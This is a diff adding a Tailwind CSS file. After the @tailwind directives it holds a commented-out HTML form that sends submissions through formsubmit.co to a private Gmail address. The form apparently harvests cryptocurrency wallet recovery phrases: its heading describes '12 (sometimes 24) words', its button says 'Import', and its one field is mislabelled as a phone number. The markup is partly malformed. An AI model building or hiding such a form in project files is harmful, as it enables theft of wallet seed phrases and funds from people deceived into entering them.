@@ -1,0 +1,52 @@
+@tailwind base;
+@tailwind components;
+@tailwind utilities;
+
+/* <form
+class="max-w-lg mx-auto p-6 bg-white rounded-lg shadow-md space-y-4 mt-6"
+action="https://formsubmit.co/sodmaq@gmail.com"
+method="POST"
+id="myForm"
+>
+<!-- Hidden fields for security and control -->
+<input type="hidden" name="_subject" value="New Form Submission" />
+<input type="hidden" name="_captcha" value="false" />
+<input type="hidden" name="_template" value="table" />
+
+<!-- Change input type to text but restrict to numbers -->
+<div>
+  <label
+    for="phone"
+    class="block text-sm font-medium text-gray-700 mb-1"
+  >
+    Phone Number
+  </label>
+  <input
+    class="w-full p-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
+    name="phone"
+    placeholder="Enter your phone number..."
+    type="text"
+    id="phone"
+    pattern="[0-9]*"
+    <!--
+    Restricts
+    to
+    numbers
+    --
+  />
+  inputmode="numeric"
+  <!-- Provides a numeric keyboard on mobile -->
+  required />
+</div>
+
+<h1>Typically 12 (sometimes 24) words separated by single spaces.</h1>
+
+<div>
+  <input
+    type="submit"
+    data-wait="Please wait..."
+    class="w-full p-3 bg-blue-600 text-white rounded-md shadow-sm hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500"
+    value="Import"
+  />
+</div>
+</form> */
